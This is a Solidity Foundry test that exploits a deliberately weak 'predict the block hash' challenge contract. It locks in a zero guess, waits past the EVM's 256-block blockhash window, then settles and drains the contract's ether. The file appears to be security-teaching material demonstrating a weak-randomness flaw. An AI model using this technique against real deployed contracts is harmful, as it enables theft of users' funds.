
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public challenge;
    address public attacker;

    function setUp() public {
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 2 ether);
    }

    function test_highlightPredictableRandomValue(uint256 initialBlockNumber) public {
        
        // --- 1. Constraints ---
        // Ensure block number is reasonable and won't overflow
        vm.assume(initialBlockNumber > 1);
        vm.assume(initialBlockNumber < type(uint256).max - 300);

        // --- 2. State Configuration ---
        
        // Set the initial block number
        vm.roll(initialBlockNumber);

        vm.startPrank(attacker);
        
        // The vulnerability: blockhash() returns 0 for blocks older than 256 blocks
        // So we can lock in a guess of bytes32(0) and wait 257+ blocks
        bytes32 predictedAnswer = bytes32(0);
        
        // Lock in our guess with 1 ether
        challenge.lockInGuess{value: 1 ether}(predictedAnswer);
        
        // The guess is locked for block.number + 1 = initialBlockNumber + 1
        uint256 guessBlock = initialBlockNumber + 1;
        
        // We need to wait at least 1 block to settle, but to exploit the vulnerability
        // we need to wait more than 256 blocks so blockhash returns 0
        // Roll forward 257 blocks from the guess block
        vm.roll(guessBlock + 257);
        
        // --- 3. Replication & Assertion ---
        
        // At this point, blockhash(guessBlock) will return bytes32(0)
        // because the EVM only stores the last 256 block hashes
        bytes32 actualBlockhash = blockhash(guessBlock);
        
        // Verify that blockhash returns 0 for blocks older than 256
        assertEq(actualBlockhash, bytes32(0), "Blockhash should be 0 for old blocks");
        
        // Our prediction matches what the contract will compute
        assertEq(predictedAnswer, actualBlockhash, "We can predict the blockhash will be 0");
        
        // Record attacker's balance before settling
        uint256 balanceBefore = attacker.balance;
        
        // Execute the settle function - this should succeed and pay out 2 ether
        challenge.settle();
        
        vm.stopPrank();
        
        // Verify we received the 2 ether payout
        uint256 balanceAfter = attacker.balance;
        assertEq(balanceAfter, balanceBefore + 2 ether, "Attacker should receive 2 ether payout");
        
        // Verify the contract is now empty
        assertEq(address(challenge).balance, 0, "Challenge contract should be drained");
    }
}
